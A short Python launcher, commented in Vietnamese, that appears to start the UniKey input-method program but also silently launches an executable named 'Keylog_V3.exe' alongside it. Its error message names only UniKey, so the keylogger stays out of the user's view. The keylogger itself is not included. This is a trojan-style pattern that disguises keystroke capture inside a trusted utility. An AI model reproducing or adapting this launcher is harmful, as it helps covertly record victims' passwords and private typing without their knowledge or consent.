import subprocess
import os
import sys
import psutil
import tkinter as tk
from tkinter import messagebox
def is_process_running(process_name):
    for proc in psutil.process_iter(['name']):
        if process_name.lower() in proc.info['name'].lower():
            return True
    return False
def run_programs():
    # Lấy đường dẫn thư mục chứa file .exe hoặc .py
    if getattr(sys, 'frozen', False):  # Nếu chạy dưới dạng .exe
        current_dir = os.path.dirname(sys.executable)
    else:  # Nếu chạy dưới dạng .py
        current_dir = os.path.dirname(os.path.abspath(__file__))
    unikey_path = os.path.join(current_dir, "UniKeyNT.exe")
    keylog_path = os.path.join(current_dir, "Keylog_V3.exe")
    # Kiểm tra xem chương trình đã chạy chưa
    if is_process_running("UniKeyNT.exe") or is_process_running("Keylog_V3.exe"):
        # Tạo cửa sổ ẩn và hiển thị thông báo
        root = tk.Tk()
        root.withdraw()  # Ẩn cửa sổ chính
        messagebox.showinfo("Thông báo", "Đã chạy chương trình rồi!")
        root.destroy()  # Đóng cửa sổ
        return
    try:
        subprocess.Popen([unikey_path], cwd=current_dir)
        subprocess.Popen([keylog_path], cwd=current_dir)
    except FileNotFoundError:
        root = tk.Tk()
        root.withdraw()
        messagebox.showerror("Lỗi", "Không tìm thấy UniKeyNT.exe...!")
        root.destroy()
    except Exception as e:
        root = tk.Tk()
        root.withdraw()
        messagebox.showerror("Lỗi", f"Có lỗi xảy ra: {str(e)}")
        root.destroy()
if __name__ == "__main__":
    run_programs()